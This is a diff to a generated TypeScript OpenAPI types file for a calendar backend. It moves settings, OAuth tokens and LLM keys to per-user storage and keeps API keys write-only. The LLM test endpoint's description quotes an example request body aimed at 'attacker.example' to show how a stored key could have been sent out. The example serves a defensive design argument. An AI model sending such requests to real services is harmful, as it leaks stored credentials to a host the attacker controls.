@@ -390,9 +390,14 @@ export interface paths {
         };
         /**
          * Microsoft OAuth callback
-         * @description Validates `ms_oauth_state`, exchanges the code, saves the Microsoft token
-         *     on the GLOBAL settings row, best-effort fetches the Graph profile and
-         *     upserts the user, then redirects.
+         * @description Validates `ms_oauth_state`, exchanges the code, fetches the Graph profile
+         *     and upserts the user, then saves the Microsoft token on THAT USER'S OWN
+         *     settings row (making Outlook their calendar provider), sets the session
+         *     cookie and redirects. Since PAC-24 the profile fetch is required, not
+         *     best-effort: without it there is no user to attach the credential to, so
+         *     a failed fetch is a 502 and nothing is saved. Before PAC-24 the token was
+         *     saved on the single shared settings row and the provider flipped for
+         *     everyone.
          *
          */
         get: operations["microsoftOAuthCallback"];
@@ -473,7 +478,7 @@ export interface paths {
         };
         /**
          * Begin the Zoom OAuth authorization-code flow.
-         * @description Sets a 300-second HttpOnly `zoom_oauth_state` cookie (SameSite=Lax, Path=/) and 302-redirects to Zoom's authorize endpoint. Not a JSON endpoint.
+         * @description Sets a 300-second HttpOnly `zoom_oauth_state` cookie (SameSite=Lax, Path=/) and 302-redirects to Zoom's authorize endpoint. Not a JSON endpoint. Requires a signed-in user since PAC-24: Zoom is connected to the caller's own settings, so there must be a caller (session cookie, which the browser sends on this top-level navigation).
          */
         get: operations["startZoomOAuth"];
         put?: never;
@@ -493,7 +498,7 @@ export interface paths {
         };
         /**
          * Zoom OAuth redirect target; exchanges the code and stores tokens.
-         * @description Compares `state` against the `zoom_oauth_state` cookie, clears that cookie, exchanges `code` for tokens, persists them, then 302-redirects to the app root. Error bodies here use `http.Error`, i.e. `text/plain; charset=utf-8` plain text, NOT the shared JSON error envelope.
+         * @description Compares `state` against the `zoom_oauth_state` cookie, clears that cookie, exchanges `code` for tokens, persists them on the CALLER'S OWN settings row (making Zoom the caller's conferencing provider, and nobody else's), then 302-redirects to the app root. Requires a signed-in user since PAC-24 (401 otherwise); before PAC-24 it wrote the single shared settings row. Error bodies here use `http.Error`, i.e. `text/plain; charset=utf-8` plain text, NOT the shared JSON error envelope.
          */
         get: operations["handleZoomOAuthCallback"];
         put?: never;
@@ -596,7 +601,7 @@ export interface paths {
         put?: never;
         /**
          * Create a standalone conference meeting with the configured provider.
-         * @description Provider comes from stored settings (`ConferencingProvider`), not from the request. No field validation at all: a missing `title`, `start` or `end` decodes to the Go zero value and is forwarded to the provider as-is. Not referenced anywhere in the frontend.
+         * @description Provider comes from the CALLER'S stored settings (`ConferencingProvider`), not from the request; the Teams credential is the caller's own (PAC-24; before it, both came from the single shared settings row). No field validation at all: a missing `title`, `start` or `end` decodes to the Go zero value and is forwarded to the provider as-is. Not referenced anywhere in the frontend.
          */
         post: operations["createConferenceLink"];
         delete?: never;
@@ -614,7 +619,7 @@ export interface paths {
         };
         /**
          * Conferencing providers this server can offer, and their connection state.
-         * @description Order is fixed: google_meet (only when Google OAuth env is configured), zoom (only when Zoom env is configured), teams (only when Microsoft env is configured), then `custom`, which is always last and always `connected: true`. Length is therefore 1..4.
+         * @description Order is fixed: google_meet (only when Google OAuth env is configured), zoom (only when Zoom env is configured), teams (only when Microsoft env is configured), then `custom`, which is always last and always `connected: true`. Connection state and the Meet email describe the CALLER'S own settings and credentials (PAC-24). Length is therefore 1..4.
          */
         get: operations["listConferenceProviders"];
         put?: never;
@@ -636,7 +641,7 @@ export interface paths {
         put?: never;
         /**
          * Clear the stored Zoom tokens.
-         * @description Takes no request body. Tokens are server-wide, not per user.
+         * @description Takes no request body. Clears the CALLER'S Zoom tokens and returns the caller's conferencing provider to `meet`; other users are untouched. Before PAC-24 the tokens were server-wide.
          */
         post: operations["disconnectZoom"];
         delete?: never;
@@ -686,7 +691,7 @@ export interface paths {
         put?: never;
         /**
          * Attach a conference link to an existing calendar event.
-         * @description Four branches. (1) The event already has a conference: returns 200 with the EXISTING link when the stored provider matches, or when `provider` is `custom`; otherwise 409. (2) `custom`: stores the supplied `url` in the event's private extended properties. (3) `google_meet`: asks Google to mint a Meet link. (4) anything else (`zoom`, `teams`): creates a meeting through the provider factory and stores the join URL in extended properties.
+         * @description Uses the CALLER'S stored settings and credentials (PAC-24). Four branches. (1) The event already has a conference: returns 200 with the EXISTING link when the stored provider matches, or when `provider` is `custom`; otherwise 409. (2) `custom`: stores the supplied `url` in the event's private extended properties. (3) `google_meet`: asks Google to mint a Meet link. (4) anything else (`zoom`, `teams`): creates a meeting through the provider factory and stores the join URL in extended properties.
          */
         post: operations["addEventConference"];
         /**
@@ -1176,7 +1181,7 @@ export interface paths {
          * @description Probes a provider configuration by issuing a fixed completion (system "You are a helpful assistant.", user "Say hello").
          *     PAC-24 resolves API-037. **THE DESTINATION IS NEVER SUPPLIED BY THE CALLER.** Every value that contributes to the URL this server requests — `llmBaseUrl`, `ollamaBaseUrl`, `azureEndpoint`, `azureDeployment`, `azureApiVersion`, `awsRegion`, `awsProfile`, `bedrockModel`, `gcpProject`, `gcpLocation`, `vertexModel` — is read from the CALLER'S OWN stored settings and from nowhere else. The request body may carry only `llmProvider`, `llmModel` and `llmApiKey`, none of which reaches a URL (`backend/nlp/llm_factory.go:13-58`: `llmModel` is consulted only by the `openai` and `anthropic` branches, where it is a JSON body field, and `llmApiKey` only as an `Authorization` header value).
          *     This is a security property of the contract, not a convenience, and the invariant is: **a credential the caller did not supply is never sent to a destination the caller did supply — because the caller cannot supply a destination at all.** An earlier draft of this contract let a body override each endpoint property individually with per-property fallback to the stored values. That let `{"llmProvider":"openai","llmBaseUrl":"https://attacker.example"}` pair a caller-chosen host with the stored key: `nlp.NewLLMClientFromSettings` builds `OpenAIClient{APIKey: s.LLMAPIKey, BaseURL: s.LLMBaseURL}` (`backend/nlp/llm_factory.go:29`) and `OpenAIClient.Complete` POSTs to `base + "/v1/chat/completions"` with `Authorization: Bearer <key>` (`backend/nlp/parser.go:31,43`), so the stored key would leave the deployment and the 200/502 would confirm delivery. An all-or-nothing body (supply the endpoint AND the key together) does not close it either: on the `azure_openai`, `bedrock` and `vertex` branches the credential is AMBIENT and cannot be submitted — `AzureOpenAIClient.Complete` mints a token with `azidentity.NewDefaultAzureCredential` and sends it as `Authorization: Bearer <token>` to `c.Endpoint` (`backend/nlp/llm_azure_openai.go:28-50`) — so any submitted endpoint is necessarily paired with a credential the caller did not supply. Refusing submitted destinations outright is the only shape that holds for all six providers.
-         *     What the body IS for: verifying a key that has not been saved, now that a stored key can never be read back (see `SettingsFields.llmApiKey`), and naming which provider the result is about (spec AC-15). An absent body, or `{}`, probes the caller's stored configuration entirely — the pre-PAC-24 behaviour.
+         *     What the body IS for: verifying a key that has not been saved, now that a stored key can never be read back (see `SettingsUpdate.llmApiKey`), and naming which provider the result is about (spec AC-15). The body is REQUIRED (revision 3): `{}` probes the caller's stored configuration entirely - the pre-PAC-24 behaviour - and an absent body is a 400, as the generated server wrapper already makes it (contract challenge r2, finding 3). In the body, `""` is a value like any other: `llmApiKey: ""` probes with no key and `llmProvider: ""` probes with no provider, which reports `LLM not configured`.
          *     Before PAC-24 the handler never read r.Body at all and always probed the SINGLETON settings row, so this operation reported on the deployment's saved configuration rather than on the caller's (API-002, API-037).
          *     No response on any status carries the submitted or the stored `llmApiKey`. The provider's own error text is still echoed on 502 — that is API-054 / T8 and is NOT resolved here; the narrower guarantee PAC-24 adds is that the key itself never appears (spec AC-14).
          *     NOT resolved here, and recorded rather than silently fixed (factory §7): a caller can still steer this probe indirectly by first writing `llmBaseUrl` or `azureEndpoint` into their OWN settings via `PATCH /api/settings` and then probing. That path exists today via the pre-PAC-24 `PUT /api/settings` plus this operation, PAC-24 neither opens nor closes it (the write is now `PATCH`), and on the ambient-credential providers it reaches a deployment-wide cloud identity rather than the caller's own key. It needs its own issue (allow-listing or scheme/host restriction on the endpoint properties); see `contracts/features/PAC-24.md` §2.
@@ -2038,8 +2043,8 @@ export interface paths {
         put?: never;
         /**
          * Render today's recap without sending it
-         * @description Builds the Slack Block Kit payload for the authenticated user at `time.Now()` and returns it. No request body is read. Nothing is sent to Slack and no Slack connection is required.
-         *     Before PAC-24 the day's content was the caller's but the recap configuration driving it (timezone, which sections to include) came from the singleton row, so a preview could omit sections the caller had enabled (API-002). Both now come from the caller's row.
+         * @description Builds the Slack Block Kit payload for the authenticated user at the current time IN THE CALLER'S TIMEZONE (`settings.timezone`, UTC when it cannot be resolved) - the same rule the scheduled recap uses - and returns it; the header names that zone and every time in the recap is rendered in it. No request body is read. Nothing is sent to Slack and no Slack connection is required.
+         *     Before PAC-24 the day's content was the caller's but the recap configuration driving it (which sections to include) came from the singleton row, so a preview could omit sections the caller had enabled (API-002), and it was built in the server's zone. Both now come from the caller's row.
          *
          */
         post: operations["previewDailyRecap"];
@@ -2060,7 +2065,7 @@ export interface paths {
         put?: never;
         /**
          * Send a test recap to Slack
-         * @description Requires a stored `slack` workspace connection for the authenticated user. Destination comes from the CALLER'S OWN stored settings (`recapSendTo`, `recapChannelId`), not from the request - no request body is read. The Slack call is bounded by a 10s context timeout.
+         * @description Requires a stored `slack` workspace connection for the authenticated user. Destination comes from the CALLER'S OWN stored settings (`recapSendTo`, `recapChannelId`), not from the request - no request body is read. The message is built at the current time in the caller's timezone, as for the preview. The Slack call is bounded by a 10s context timeout.
          *     Before PAC-24 the destination came from the singleton row, so a test send could be addressed to a channel another user had configured (API-002).
          *
          */
@@ -3246,9 +3251,9 @@ export interface components {
         };
         /** @description Optional body for POST /api/llm/test. Added by PAC-24 to close API-037.
          *     **This schema is a closed list of three properties and that is the whole point of it.** Not one of them can contribute to the URL the server requests, so no submitted value can direct a stored or ambient credential anywhere. The endpoint properties a probe might plausibly want to override - `llmBaseUrl`, `ollamaBaseUrl`, `azureEndpoint`, `azureDeployment`, `azureApiVersion`, `awsRegion`, `awsProfile`, `bedrockModel`, `gcpProject`, `gcpLocation`, `vertexModel` - are DELIBERATELY ABSENT and are a 400 via `additionalProperties: false`. The operation description carries the full argument, including why an all-or-nothing body (endpoint plus credential together) does not close the channel on the three ambient-credential providers.
-         *     An absent body, or `{}`, probes the caller's stored configuration - the pre-PAC-24 behaviour. `{"llmApiKey": "sk-..."}` probes an unsaved key against the caller's stored endpoint, which is the case the settings UI needs because a stored key can no longer be read back to re-submit.
-         *     This is deliberately NOT `SettingsUpdate`. Sharing that schema would re-admit every endpoint property by inheritance, which is precisely the defect this shape exists to prevent, and would make a probe read like a write. The three property names match the corresponding SettingsFields ones so a client can build this from the document it already holds.
-         *     `llmApiKey` here is `writeOnly` for the same reason it is on SettingsFields: it is accepted and is never echoed, including in the 400 and 502 bodies (spec AC-14). Nothing submitted here is persisted.
+         *     Required. `{}` probes the caller's stored configuration - the pre-PAC-24 behaviour; an absent body is a 400. `{"llmApiKey": "sk-..."}` probes an unsaved key against the caller's stored endpoint, which is the case the settings UI needs because a stored key can no longer be read back to re-submit.
+         *     This is deliberately NOT `SettingsUpdate`. Sharing that schema would re-admit every endpoint property by inheritance, which is precisely the defect this shape exists to prevent, and would make a probe read like a write. The three property names match the corresponding SettingsUpdate ones so a client can build this from the document it already holds.
+         *     `llmApiKey` here is `writeOnly` for the same reason it is on SettingsUpdate: it is accepted and is never echoed, including in the 400 and 502 bodies (spec AC-14). Nothing submitted here is persisted.
          *      */
         LLMTestRequest: {
             /**
@@ -3278,7 +3283,7 @@ export interface components {
             provider: "" | "openai" | "anthropic" | "ollama" | "bedrock" | "azure_openai" | "vertex";
         };
         /** @description storage.LunchBreakSchedule - a bare map keyed by lowercase weekday name. Normalised to `{}` (never null) on read (`backend/storage/settings.go:103-105`). A per-day entry overrides the legacy global `lunchStart`/`lunchEnd`/`protectLunch` trio, including disabling lunch for that day. Replaced whole by a PATCH that mentions it; `lunchBreaks: {}` clears every per-day override (spec AC-9).
-         *     `propertyNames` is added by PAC-24 for the same reason as on `WorkingHoursSchedule.days`: the validator lowercases the key before checking (`backend/api/handlers_settings.go:154`) but `LunchWindow` looks it up already-lowercased (`backend/storage/settings.go:138`), so a `"Monday"` key validates, stores, and never matches.
+         *     Keys are enforced EXACTLY by the handler (revision 3; generators drop `propertyNames`), and migration 024 removes stored keys that are not one of the seven lowercase names, or whose `start`/`end` are neither empty nor a clock. Before PAC-24 the validator lower-cased the key, so a `"Monday"` key was stored and never matched `LunchWindow`'s lookup.
          *      */
         LunchBreakSchedule: {
             [key: string]: components["schemas"]["DaySchedule"];
@@ -3996,14 +4001,145 @@ export interface components {
             /** @description Links where the caller is an accepted co-host but not the owner. */
             shared: components["schemas"]["SchedulingLink"][];
         };
-        /** @description The settings document for ONE user, returned by GET and by PATCH. Every property is always present except `llmApiKey`, which is `writeOnly` and therefore never present (spec AC-11); `llmApiKeySet` takes its place in the required list.
+        /** @description The settings document for ONE user, returned by GET and by PATCH. Every property is always present. It has NO `llmApiKey` property at all: the key is write-only and is never returned (spec AC-11); `llmApiKeySet` reports whether one is on file. Property names come straight from the json tags on storage.Settings, camelCase throughout. `ID`, `MicrosoftTokens` and `ZoomTokens` are `json:"-"` and never appear.
+         *     PAC-24 revision 3 makes this a concrete schema rather than an `allOf` over a shared field set with `readOnly`/`writeOnly` markers: all three generators (oapi-codegen, openapi-typescript, typed-openapi) dropped those markers and generated a response type carrying `llmApiKey`, and typed-openapi also dropped the `required` list (contract challenge, revision 2, finding 1). The property map is shared with `SettingsUpdate` through a YAML anchor, so the two cannot drift; every `Settings` document is a valid `SettingsUpdate` body.
+         *     Every value this schema forbids has been normalised away in storage by migration 024 (see `SettingsUpdate` and contracts/features/PAC-24.md, Revisions 3 and 4), so a GET always satisfies it.
          *      */
-        Settings: WithRequired<components["schemas"]["SettingsFields"], "workStart" | "workEnd" | "timezone" | "focusMinBlockMinutes" | "focusMaxBlockMinutes" | "focusDailyTargetMinutes" | "outOfHoursMeetingsPerWeek" | "autoDeclineOutsideWorkingHours" | "focusLabel" | "focusColor" | "lunchStart" | "lunchEnd" | "protectLunch" | "bufferBeforeMinutes" | "bufferAfterMinutes" | "bufferEnabled" | "bufferMinMeetingMinutes" | "bufferSkipBackToBack" | "workingHours" | "lunchBreaks" | "compressionEnabled" | "autoScheduleEnabled" | "autoScheduleCron" | "llmProvider" | "llmModel" | "llmApiKeySet" | "llmBaseUrl" | "awsRegion" | "awsProfile" | "bedrockModel" | "azureEndpoint" | "azureDeployment" | "azureApiVersion" | "gcpProject" | "gcpLocation" | "vertexModel" | "ollamaBaseUrl" | "ollamaModel" | "calendarProvider" | "webcalUrl" | "calendarEmail" | "conferencingProvider" | "recapEnabled" | "recapSendTime" | "recapSendTo" | "recapChannelId" | "recapIncludeBriefs" | "recapIncludeFocus" | "recapIncludeHabits" | "updatedAt">;
-        /** @description The property set shared by the GET response (`Settings`) and the PATCH / PATCH body (`SettingsUpdate`). Property names come straight from the json tags on storage.Settings - camelCase throughout. `ID`, `MicrosoftTokens` and `ZoomTokens` are `json:"-"` and never appear on the wire.
-         *     Two properties are asymmetric and are marked as such rather than being split into two schemas, so that a document read from GET can be submitted back unchanged (which is what the shipped frontend does): `llmApiKey` is `writeOnly` - accepted on write, never returned; and `llmApiKeySet` and `updatedAt` are `readOnly` - returned, accepted and ignored on write. Everything else is symmetric.
-         *     No property other than `llmApiKey` carries omitempty, so the GET response always contains all of them.
+        Settings: {
+            /** @description `HH:MM`, OR THE EMPTY STRING. DB default `09:00`. PAC-24 tightened the shape from `^[0-9]{2}:[0-9]{2}$`, which admitted `99:99` (the server's own check was the same loose regexp, so `99:99` was stored), and at the same time widened it to admit `""`, which the server both accepts and returns.
+             *     `""` is not a modelling slip, it is the state the data is in. `validateSettings` skips the format check exactly when the value is empty (`backend/api/handlers_settings.go:75`, `if val != "" && !timePattern.MatchString(val)`), and every row zeroed by API-004 - the defect this feature exists to repair - already holds `""` in this column, because the pre-PAC-24 full replace persisted each omitted property as its Go zero value. A strict `HH:MM` pattern would make day-one GETs fail the contract they were generated from, and the generated zod schema would reject the body before any UI saw it. It is also what makes spec AC-7 satisfiable: `{"workStart": ""}` is the documented way to clear this setting, and under the merge rule a present property is stored exactly as given.
+             *     Consumers already treat `""` as meaningful rather than as damage: `WorkWindow` falls back to `09:00`/`18:00` when the effective start or end is empty (`backend/storage/settings.go:124-127`). The same widening, for the same reason, was already applied to `DaySchedule.start`/`end`. Contrast `recapSendTime`, which is NOT widened - see its own description.
+             *      */
+            workStart: string;
+            /** @description `HH:MM` or `""`, as `workStart`. DB default `18:00`. PAC-24 adds the cross-property check that workEnd > workStart, which OpenAPI cannot express; it is a 400 (`workEnd must be after workStart`). That check applies only when BOTH values are non-empty, which is the existing handler behaviour and keeps `""` a clear rather than a 400. Before PAC-24 an inverted working day was accepted and produced a zero-length day at use (API-082).
+             *      */
+            workEnd: string;
+            /** @description IANA name, e.g. `Europe/Paris`. DB default `UTC`. PAC-24 validates it with time.LoadLocation and returns 400 `timezone is not a known IANA location`. Before PAC-24 any string was accepted and every engine silently fell back to UTC, so a typo moved a user's whole schedule with no error anywhere (API-082).
+             *      */
+            timezone: string;
+            /** @description Rejected when < 0. DB default 25. */
+            focusMinBlockMinutes: number;
+            /** @description Rejected when < 0. DB default 120. PAC-24 adds the cross-property check focusMinBlockMinutes <= focusMaxBlockMinutes, which OpenAPI cannot express; it is a 400 (API-082).
+             *      */
+            focusMaxBlockMinutes: number;
+            /** @description Rejected when < 0. DB default 240. */
+            focusDailyTargetMinutes: number;
+            /** @description Weekly allowance of meetings outside working hours. 0 disables out-of-hours scheduling entirely (canScheduleOutOfHours returns false when <= 0).
+             *      */
+            outOfHoursMeetingsPerWeek: number;
+            autoDeclineOutsideWorkingHours: boolean;
+            /** @description DB default `Focus Time`. */
+            focusLabel: string;
+            /** @description Hex colour string. Not validated. DB default `#4F46E5`. */
+            focusColor: string;
+            /** @description `HH:MM` or `""`. DB default `12:00`. Legacy global; overridden per-day by lunchBreaks. `""` here is the strongest case of the four: it is not merely tolerated but LOAD-BEARING. `LunchWindow` returns `enabled: false` precisely when `lunchStart` or `lunchEnd` is empty (`backend/storage/settings.go:141-142`), so `""` is how "this user has no protected lunch" is represented. Forbidding it in the schema would make an existing, meaningful state unrepresentable.
+             *      */
+            lunchStart: string;
+            /** @description `HH:MM` or `""`, as `lunchStart`. DB default `13:00`. PAC-24 adds the cross-property check lunchEnd > lunchStart as a 400 (API-082), applied only when both values are non-empty.
+             *      */
+            lunchEnd: string;
+            /** @description DB default true. */
+            protectLunch: boolean;
+            /** @description Rejected when < 0. DB default 5. */
+            bufferBeforeMinutes: number;
+            /** @description Rejected when < 0. DB default 5. */
+            bufferAfterMinutes: number;
+            bufferEnabled: boolean;
+            /** @description PAC-24 adds the `>= 0` check its two siblings already had; before that a negative value was accepted here alone (API-082).
+             *      */
+            bufferMinMeetingMinutes: number;
+            bufferSkipBackToBack: boolean;
+            workingHours: components["schemas"]["WorkingHoursSchedule"];
+            lunchBreaks: components["schemas"]["LunchBreakSchedule"];
+            compressionEnabled: boolean;
+            autoScheduleEnabled: boolean;
+            /** @description 5-field cron (minute hour dom month dow), parsed with robfig/cron v3 using exactly those five fields. Empty string skips validation. DB default `0 8 * * *`.
+             *      */
+            autoScheduleCron: string;
+            /**
+             * @description Empty string is explicitly allowed by validLLMProviders.
+             * @enum {string}
+             */
+            llmProvider: "" | "openai" | "anthropic" | "ollama" | "bedrock" | "azure_openai" | "vertex";
+            /** @description Provider default applied at call time when empty: `gpt-4o-mini` (openai), `claude-haiku-4-5-20251001` (anthropic).
+             *      */
+            llmModel: string;
+            /** @description `true` exactly when the stored key is non-empty. This is the only thing a reader learns about the key, and it is what lets a client distinguish "not configured" from "configured" without disclosing anything (spec AC-12).
+             *     `readOnly`, so a client that submits back a document it just read may include it; it is accepted and ignored (spec AC-10). It is NOT the way to clear a key - send `llmApiKey: ""` for that.
+             *      */
+            readonly llmApiKeySet: boolean;
+            /** @description Also the legacy fallback for the ollama base URL. */
+            llmBaseUrl: string;
+            awsRegion: string;
+            awsProfile: string;
+            bedrockModel: string;
+            azureEndpoint: string;
+            azureDeployment: string;
+            azureApiVersion: string;
+            gcpProject: string;
+            gcpLocation: string;
+            vertexModel: string;
+            /** @description Falls back to llmBaseUrl, then `http://localhost:11434`. */
+            ollamaBaseUrl: string;
+            /** @description Falls back to llmModel, then `llama3.2`. */
+            ollamaModel: string;
+            /**
+             * @description DB default `google`. Which calendar the product reads and writes for THIS user.
+             *     Resolves U-18. The authoritative set was settled by reading the three consumers that switch on this value - calendar.NewProvider (`backend/calendar/client_factory.go:16,22,27`), the auth-status handler (`backend/api/handlers_auth.go:97,105,111`) and the free/busy service (`backend/engine/freebusy_service.go:122`). All three accept exactly `outlook` and `webcal` and treat every other value, including a typo, as Google. PAC-24 enforces the set; before it, an unknown value was stored and silently behaved as `google`.
+             *     Before PAC-24 this was a property of the singleton row, so one user connecting Outlook switched the whole deployment (`backend/auth/microsoft_oauth.go:57` writes `calendar_provider = 'outlook' WHERE id = 1`).
+             *
+             * @enum {string}
+             */
+            calendarProvider: "google" | "outlook" | "webcal";
+            webcalUrl: string;
+            /** @description The address of THIS user's connected calendar. Before PAC-24 the auth-status handler served the singleton row's value to everyone (API-009).
+             *      */
+            calendarEmail: string;
+            /**
+             * @description Read with `COALESCE(conferencing_provider,'meet')`; conference.NewProvider switches on `zoom`, `teams`, and treats everything else as `meet`. So the wire values are `meet` / `zoom` / `teams`, not the frontend's `google_meet` / `zoom` / `teams` / `custom`. PAC-24 enforces the set for the same reason as calendarProvider: an unknown value was stored and silently behaved as `meet`.
+             *
+             * @enum {string}
+             */
+            conferencingProvider: "meet" | "zoom" | "teams";
+            recapEnabled: boolean;
+            /** @description `HH:MM`, in the same form on read and on write. **STRICT: unlike the four legacy clock properties above, `""` is NOT admitted here, in either direction.** The three reasons are specific to this column and do not generalise:
+             *     (a) There is no empty state to represent. The column is `TIME NOT NULL DEFAULT '08:00'` (`015_daily_recap.up.sql:3`), and the write path passes every value through `recapSendTimeOrDefault` (`backend/storage/settings.go:356-361`), which turns `""` into `08:00`. So no row can hold an empty send time and no GET can return one - the `COALESCE(...,'')` at `:224` and `:439` is defensive and unreachable. This is the difference from `workStart`/`lunchStart`, where `""` both exists in the data and carries meaning.
+             *     (b) Admitting `""` would make this contract lie about its own merge rule. `PATCH /api/settings` states that a property present is set to exactly the value given; `""` here would instead be silently rewritten to `08:00`. A client asking to clear a value and being told `200` while the server stored something it did not ask for is the exact silent-success failure mode this contract refuses for `null`.
+             *     (c) PAC-24 therefore removes the substitution: `""` is a 400 (`recapSendTime must be in HH:MM format`), which is the same message spec AC-17 already requires for a malformed value and which AC-16 requires instead of an internal failure.
+             *     **This requires a narrow amendment to spec AC-7**, which as written says an empty value of a setting's type always clears it. AC-7 must exempt `recapSendTime` on the ground that it has no empty state. The contract author may not edit the spec; the amendment is named in `contracts/features/PAC-24.md` §"Revision 2" and must be made before stage 3.
+             *     Resolves U-19, and resolves it by CHANGING the server rather than by documenting what it did. The column is Postgres `TIME` (`015_daily_recap.up.sql:3`) and was read as `recap_send_time::TEXT`, which renders `HH:MM:SS` (`08:00:00`, with a fractional part when one was stored) - contradicting the struct comment that claims `HH:MM` and contradicting the write format, so no client could round-trip this value. PAC-24 renders the column to `HH:MM` on read and rejects anything else on write. Note: the marker was originally to be settled by observing a live response; it is settled here by fixing the asymmetry instead, which makes the observation unnecessary. Spec AC-16 is the integration test that proves the rendered form.
+             *      */
+            recapSendTime: string;
+            /**
+             * @description DB CHECK constraint enforces this. PAC-24 validates it on the settings write too; before that only the daily-recap PATCH did, so a bad value sent to PUT /api/settings reached the DB CHECK and surfaced as a 500 (API-081).
+             *
+             * @enum {string}
+             */
+            recapSendTo: "dm" | "channel";
+            recapChannelId: string;
+            /** @description DB default true. */
+            recapIncludeBriefs: boolean;
+            /** @description DB default true. Exposed as `include_focus_blocks` by the daily-recap endpoints.
+             *      */
+            recapIncludeFocus: boolean;
+            /** @description DB default true. */
+            recapIncludeHabits: boolean;
+            /**
+             * Format: date-time
+             * @description Server-managed (NOW() on every write). May be present in a request body - a client submitting back a document it just read will include it - and is ignored (spec AC-10).
+             *
+             */
+            readonly updatedAt: string;
+        };
+        /** @description PATCH /api/settings body - the only settings write. Nothing is required: a property absent means "leave it as it is", and `{}` is a valid no-op request. A property present is applied exactly as given - `""`, `0` and `false` are values, not absences, except where a property's enum or pattern excludes `""` (`recapSendTime`, `recapSendTo`, `calendarProvider`, `conferencingProvider`), where `""` is a 400 like any other value outside the set (spec AC-7 as amended 2026-10-12).
+         *     The same properties as `Settings` (one YAML anchor) plus the write-only `llmApiKey`. `llmApiKeySet` and `updatedAt` are accepted and ignored, so a document read from GET can be submitted back unchanged (spec AC-10).
+         *     No property is nullable: `null` is a 400 `<property> must not be null` and an unknown property - including a snake_case spelling of a real one - is a 400 `unknown property: <name>` (spec AC-8). These are enforced by the handler, not by a generated validator.
+         *     Validation applies to the properties whose value the body CHANGES. A property sent with the value already stored is not re-validated, so a GET document submitted back unchanged is always accepted - including a legacy combination a newer cross-property rule would reject (an end before a start, a focus minimum above the maximum) - and a stored value never locks the user out of saving something else (challenge r2, finding 2).
+         *     `workingHours` is ONE property and is replaced whole, so a write that changes it must make the whole document valid: both its `default` and its `days`, whatever the mode. That includes a `default` the client derived from legacy values - for a row whose mode was `""` the server derives it from `workStart`/`workEnd` on read - so a client switching such a row to `by_day` must send a valid `default` (revision 6).
+         *     `workingHours` and `lunchBreaks` are replaced whole when present, not deep-merged (spec AC-9).
+         *     Before PAC-24 this was the body of `PUT /api/settings`, a replace: every omitted property was persisted as its Go zero value (API-004). That operation is removed because the two repositories deploy together (spec PAC-24, Decisions 2026-10-12, OQ-3).
          *      */
-        SettingsFields: {
+        SettingsUpdate: {
             /** @description `HH:MM`, OR THE EMPTY STRING. DB default `09:00`. PAC-24 tightened the shape from `^[0-9]{2}:[0-9]{2}$`, which admitted `99:99` (the server's own check was the same loose regexp, so `99:99` was stored), and at the same time widened it to admit `""`, which the server both accepts and returns.
              *     `""` is not a modelling slip, it is the state the data is in. `validateSettings` skips the format check exactly when the value is empty (`backend/api/handlers_settings.go:75`, `if val != "" && !timePattern.MatchString(val)`), and every row zeroed by API-004 - the defect this feature exists to repair - already holds `""` in this column, because the pre-PAC-24 full replace persisted each omitted property as its Go zero value. A strict `HH:MM` pattern would make day-one GETs fail the contract they were generated from, and the generated zod schema would reject the body before any UI saw it. It is also what makes spec AC-7 satisfiable: `{"workStart": ""}` is the documented way to clear this setting, and under the merge rule a present property is stored exactly as given.
              *     Consumers already treat `""` as meaningful rather than as damage: `WorkWindow` falls back to `09:00`/`18:00` when the effective start or end is empty (`backend/storage/settings.go:124-127`). The same widening, for the same reason, was already applied to `DaySchedule.start`/`end`. Contrast `recapSendTime`, which is NOT widened - see its own description.
@@ -4062,11 +4198,6 @@ export interface components {
             /** @description Provider default applied at call time when empty: `gpt-4o-mini` (openai), `claude-haiku-4-5-20251001` (anthropic).
              *      */
             llmModel?: string;
-            /** @description WRITE-ONLY. Accepted on write; never present in any response from any operation (spec AC-11). Required for openai and anthropic.
-             *     Under the merge semantics this needs no special case: omit it and the stored key is unchanged; send `""` and it is cleared; send a value and it is replaced (spec AC-13). There is no way to read it back, by design - someone who loses their key re-enters it. Do not add a reveal affordance later.
-             *     Before PAC-24 it was returned in cleartext from a row shared by every authenticated account (API-002 + API-003), and wiped by any write that omitted it (API-004). Every key configured before this ships must be treated as compromised and rotated - closing the read path does not un-expose it (spec §5, OQ-5).
-             *      */
-            llmApiKey?: string;
             /** @description `true` exactly when the stored key is non-empty. This is the only thing a reader learns about the key, and it is what lets a client distinguish "not configured" from "configured" without disclosing anything (spec AC-12).
              *     `readOnly`, so a client that submits back a document it just read may include it; it is accepted and ignored (spec AC-10). It is NOT the way to clear a key - send `llmApiKey: ""` for that.
              *      */
@@ -4133,13 +4264,12 @@ export interface components {
              *
              */
             readonly updatedAt?: string;
+            /** @description WRITE-ONLY. Accepted on write; never present in any response from any operation (spec AC-11). Required for openai and anthropic.
+             *     Under the merge semantics this needs no special case: omit it and the stored key is unchanged; send `""` and it is cleared; send a value and it is replaced (spec AC-13). There is no way to read it back, by design - someone who loses their key re-enters it. Do not add a reveal affordance later.
+             *     Before PAC-24 it was returned in cleartext from a row shared by every authenticated account (API-002 + API-003), and wiped by any write that omitted it (API-004). Every key configured before this ships must be treated as compromised and rotated - closing the read path does not un-expose it (spec §5, OQ-5).
+             *      */
+            llmApiKey?: string;
         };
-        /** @description PATCH /api/settings body - the only settings write. Nothing is required: a property absent means "leave it as it is", and `{}` is a valid no-op request. A property present is applied exactly as given - `""`, `0` and `false` are values, not absences.
-         *     No property is nullable, so `null` anywhere in this body is a 400 rather than a silent no-op (spec AC-8). `additionalProperties: false` is inherited from SettingsFields, so an unknown property - including a snake_case spelling of a real one - is rejected rather than ignored; that is what makes API-013 detectable instead of silent.
-         *     `workingHours` and `lunchBreaks` are replaced whole when present, not deep-merged (spec AC-9). `llmApiKeySet` and `updatedAt` are `readOnly` and are accepted and ignored.
-         *     Before PAC-24 this was the body of `PUT /api/settings`, a replace: every omitted property was persisted as its Go zero value (API-004). That operation is removed, not deprecated - its only consumer (`smart-calendar-flow/src/api/client.ts:813`) sends snake_case names that `additionalProperties: false` refuses on either method, so a deprecated alias would have shielded nothing.
-         *      */
-        SettingsUpdate: components["schemas"]["SettingsFields"];
         /** @description engine.slackBlock is `map[string]interface{}` - an untyped Slack Block Kit object. Nested values are themselves slackBlocks or arrays of them.
          *     Resolves U-20 by reading engine/daily_recap.go end to end. Every top-level block this API can emit is built by DailyRecapService.BuildMessage (`:150-236`), buildSummaryBlock (`:238-262`) or buildMeetingBlocks, and the complete set of top-level `type` values is `header`, `context`, `section`, `divider`. The only nested text object types are `plain_text` and `mrkdwn`.
